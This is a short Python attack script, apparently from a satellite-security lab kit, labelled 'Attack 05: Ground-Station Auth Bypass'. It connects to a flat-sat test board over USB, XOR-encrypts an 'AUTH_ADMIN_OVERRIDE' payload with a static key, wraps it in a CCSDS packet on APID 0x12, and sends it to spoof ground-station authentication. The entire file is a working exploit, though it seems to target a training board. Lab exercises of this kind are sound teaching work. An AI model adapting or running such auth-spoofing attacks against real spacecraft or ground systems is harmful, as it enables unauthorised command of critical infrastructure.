#!/usr/bin/env python3
"""
Attack 05: Ground-Station Auth Bypass (USB Variant)
Bypasses ground-station authentication via static XOR key on APID 0x12 for flat-sat-fw-interno.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Attack 05: Ground-Station Auth Bypass (flat-sat-fw-interno USB Variant)")
    usb = FlatSatUSB()
    if not usb.connect():
        print("[X] Failed to connect to FlatSat USB port.")
        sys.exit(1)

    raw_payload = b"AUTH_ADMIN_OVERRIDE"
    xor_key = b"PWNSAT"
    enc_payload = bytes([b ^ xor_key[i % 6] for i, b in enumerate(raw_payload)])

    packet = build_ccsds_packet(apid=0x12, payload=enc_payload)
    usb.send_raw(packet)
    print("[✓] XOR-encrypted auth spoofing payload sent over USB. NeoPixel LED set to Cyan.")
    usb.close()

if __name__ == "__main__":
    main()
